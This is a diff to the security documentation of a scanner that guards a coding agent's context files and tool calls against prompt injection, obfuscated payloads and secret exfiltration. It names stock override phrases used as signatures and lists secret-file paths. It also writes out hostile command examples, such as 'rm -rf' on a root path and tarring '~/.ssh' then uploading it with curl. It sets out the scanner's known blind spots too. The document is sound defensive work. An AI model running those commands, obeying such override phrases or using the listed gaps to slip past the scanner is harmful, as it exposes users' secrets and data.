@@ -8,10 +8,10 @@ explains how the engine protects you. It is the honest version: what the
 scanner can see, what it cannot, and where the limits are.
 
 Everything below lives in `.pi/extensions/context-engine/security/` (types,
-unicode, encoding, markdown, rules, commands, scan, trust, actions, npm,
-urlhaus, config) and runs with **zero runtime dependencies** — Node built-ins
-only (`node:crypto` for SHA-256, native `fetch` for the optional network
-signals).
+position, unicode, encoding, markdown, rules, commands, scan, trust, actions,
+npm, urlhaus, config) and runs with **zero runtime dependencies** — Node
+built-ins only (`node:crypto` for SHA-256, native `fetch` for the optional
+network signals).
 
 ## Overview: two independent barriers
 
@@ -19,19 +19,31 @@ signals).
 load (`session_start`, `/nma reload`), each `.md` file in `.pi/context/` is:
 
 1. normalized (`\r\n` → `\n`) and **decoded** (base64/hex/URL-encoding,
-   recursively, depth 2 — decoded content is scanned, never written back);
+   recursively, depth 4 — decoded content is scanned, never written back);
+   decoding that exhausts the depth is never silent: it emits a `medium`
+   `obf-depth-exhausted` finding;
 2. scanned: unicode, hidden Markdown, prompt-injection signatures, external
    references, and the **frontmatter scanned separately as code**;
 3. aggregated into `none / low / medium / high / critical` and filtered
    through the trust store (path + SHA-256).
 
 The gate runs *before* parsing. A file that fails the scan never reaches the
-rule loader.
+rule loader. Two files never reach the scanner at all: `README.md` (a
+convention — the folder's own readme is not a rule) and any file over **5 MB**
+(skipped with a notification, fail-closed — a huge file is never loaded).
 
 **Barrier B — action barrier** (`securityBarrier` in `index.ts`). On every
 `tool_call` and `user_bash`, the actual tool input is scanned **before** user
 rules run. A `block` short-circuits the rule loop — user rules cannot lift it
 (`modify` cannot prefix a blocked command).
+
+The action scan covers the shell-like tools (`bash`, `sh`, `zsh`, `shell`,
+`pwsh`, `powershell`) and the file tools `read`/`write`/`edit` (writing a
+script that executes, or touching secret/system paths, is flagged; a written
+file whose path is script-like — shebang or `.sh/.bash/.zsh/.py/.js/.mjs/.cjs/.ts/.rb/.pl`
+extension — has its content re-scanned as a command). **Any other tool name
+is not scanned** — coverage depends on the exact tool names pi uses, so a
+tool outside these sets never triggers the action barrier.
 
 **Barrier B is conditional.** The extension is a bridge between pi and the
 user, not a default command enforcer: the action barrier only runs while at
@@ -76,7 +88,7 @@ you have **not** reviewed yet.
 | Category | What it detects | Finding ids (examples) |
 | --- | --- | --- |
 | `prompt-injection` | instruction override, system-prompt extraction, impersonation (`[SYSTEM]`…), persona hijack, tool manipulation, RAG poisoning | `pi-override`, `pi-system-extract`, `pi-impersonation`, `pi-persona`, `pi-tool-manip`, `pi-rag` |
-| `obfuscation` | zero-width / BIDI characters, homoglyphs, normalization anomalies; base64/hex/URL-encoded blobs (recursive, depth 2); instructions hidden in HTML comments or Markdown link text | `uni-zerowidth`, `uni-bidi`, `obf-base64-cmd`, `obf-<kind>-cmd`, `obf-<kind>`, `md-comment-instr`, `md-link-instr` |
+| `obfuscation` | zero-width / BIDI characters, homoglyphs, normalization anomalies; base64/hex/URL-encoded blobs (recursive, depth 4, exhaustion signaled as `obf-depth-exhausted`); instructions hidden in HTML comments or Markdown link text | `uni-zerowidth`, `uni-bidi`, `obf-base64-cmd`, `obf-<kind>-cmd`, `obf-<kind>`, `obf-depth-exhausted`, `md-comment-instr`, `md-link-instr` |
 | `external` | URLs classified by their lexical neighborhood: "download and follow instructions", "read the instructions at …", plain doc URLs (low or nothing) | `ext-exec` (terminal), `ext-instructions-download`, `ext-instructions-read`, `ext-instructions`, `ext-doc` |
 | `command` | shell pipelines as *actions*: download+exec (including file-mediated across `&&`/`;`), base64→shell, interpreter inline eval (`-c`/`-e`/`-p`/`-r`), destructive targets, privilege escalation, persistence, global installs | `cmd-dl-exec` (terminal), `cmd-obf-exec` (terminal), `cmd-interp-eval`, `cmd-destructive` (terminal), `cmd-priv-esc`, `cmd-persist`, `cmd-install-global`, `cmd-install` (low) |
 | `secrets` / `exfiltration` | secret-material paths (`.ssh`, `.env`, `.pem`, `id_rsa`, AWS credentials, `.npmrc`); secret read combined with a network transfer | `cmd-secret-read`, `cmd-secret-exfil` (terminal), `act-secret-path` |
@@ -105,8 +117,9 @@ Aggregation (`aggregate`, calibrated — the fixture corpus is the gate):
   ≤ 24 → `high` · ≥ 25 → `critical`**.
 - a single **medium**+ finding never aggregates below `medium` — one real
   signal always prompts. Calibrated consequence: `npm i -g`, a lone `curl`
-  download, or a single quoted attack phrase now confirm instead of loading
-  silently.
+  download, or a single quoted attack phrase in an *imperative* position now
+  confirm instead of loading silently. (An inline quote inside plain prose
+  stays `low` — see the honest limits below.)
 
 The provenance nudge (see below) can raise the level one step. A scan error
 never blocks loading silently: the file is treated as `high` risk and skipped.
@@ -155,7 +168,10 @@ command is asked again. Without a UI, every confirmation is fail-safe:
   until the next successful write). A corrupt store is reported as a warning
   and treated as empty — it never crashes a load.
 - Approval happens automatically when a `medium`/`high` confirm is accepted,
-  or explicitly with `/nma trust <file>`. Revoke with `/nma untrust <file>`
+  or explicitly with `/nma trust <file>`. `/nma trust` re-scans the file and
+  **refuses** if the scan errors (unless `--yes`), and requires a
+  confirmation for `high`/`critical` levels (with `--yes` as the explicit
+  override without a UI). Revoke with `/nma untrust <file>`
   (immediate reload). `/nma security` lists every scanned file with its
   level, load state, trust state, and findings.
 
@@ -197,8 +213,9 @@ API):
 URLhaus (`security/urlhaus.ts`) is an opt-in host-reputation module gated on
 `NMA_URLHAUS_KEY`, disabled by default; API failure returns `null`, never a
 "safe" answer. Honest note: the module is currently **not wired into the
-decision pipeline** — enabling the key alone changes nothing today; it ships
-as a tested, ready-to-integrate building block.
+decision pipeline** — it is dead code today (tested, ready-to-integrate, but
+never called at runtime; a grep for `checkUrlhausHost` finds only the module
+and its test). Enabling the key alone changes nothing yet.
 
 ## False positives / false negatives — the honest limits
 
@@ -218,8 +235,11 @@ as a tested, ready-to-integrate building block.
   collapsed to a single space before matching — a phrase that only matches
   after collapsing is `medium`+; canonical override phrases ("ignore the
   previous instructions", "ignore prior instructions", "disregard the
-  previous rules", …) are now signatures, so documentation that quotes them
-  scans `medium`+ — assumed trade-off: it confirms, never blocks; trigger
+  previous rules", …) are now signatures: quoting one in an *imperative*
+  position (line start, list item, blockquote) scans `medium`+ — assumed
+  trade-off: it confirms, never blocks — while the same phrase quoted inline
+  in plain prose stays `low` (severity is decided per line by
+  `classifyLine`); trigger
   phrases split across line breaks are
   recombined; at barrier B, base64/hex/URL-decoded content is re-scanned as a
   command, and `base64 -d` piped to a shell is terminal (`cmd-obf-exec`);
@@ -229,10 +249,11 @@ as a tested, ready-to-integrate building block.
   exfiltration via `nc < secret` or `tar | curl @-` is caught.
 - **DoS posture.** Positions are resolved through a precomputed line index
   (`security/position.ts`, O(log n) per lookup — no quadratic scans); findings
-  per file are capped at 2000 and pushed in a loop (no spread overflow); all
-  regexes are simple, bounded and linear — no catastrophic backtracking.
-  Adversarial perf tests lock this in: 20 000 base64 blobs under 1 s, a
-  300 KB decode-bomb stays bounded without throwing.
+  per file are capped at 2000 and pushed in a loop (no spread overflow); the
+  cap reserves 100 slots for terminal/critical findings, so a scan flood never
+  hides a dangerous signal; all regexes are simple, bounded and linear — no
+  catastrophic backtracking. Adversarial perf tests lock this in: 20 000
+  base64 blobs under 1 s, a 300 KB decode-bomb stays bounded without throwing.
 - **Honest limits.** Pure-homoglyph words (all non-ASCII letters) are not
   flagged — realistic payloads always mix ASCII and are caught; env-var
   indirection (`DIR=/; rm -rf $DIR`) is not resolved; user `match.regex`
@@ -245,12 +266,11 @@ as a tested, ready-to-integrate building block.
   trust store's final rename is last-writer-wins (a lost
   approval is fail-closed, never fail-open); interpreter payloads stay opaque
   (flagged `medium` by default, `high` when they contain destructive/network
-  tokens); `--eval` long forms are not covered; file-mediated upload across
-  `;` (`tar czf t.tgz ~/.ssh; curl -F file=@t.tgz URL`) is not covered; a URL
+  tokens); `--eval` long forms are not covered; a URL
   whose instruction sits 80+ characters away on the same line keeps a bounded
   window (anti-false-positive, the adjacent-line context still applies).
 - **The calibration corpus is the permanent gate** (`security/fixtures/`,
-  77 Markdown files + `expected.json`, including an intentional
+  85 Markdown files + `expected.json`, including an intentional
   `false-positives/` set and two documented `benign/` pins): any scoring
   change must keep it green — benign ≤ `low`, false-positives ≤ `medium`,
   malicious ≥ `high`. Performance budget tests keep a 100-file load under
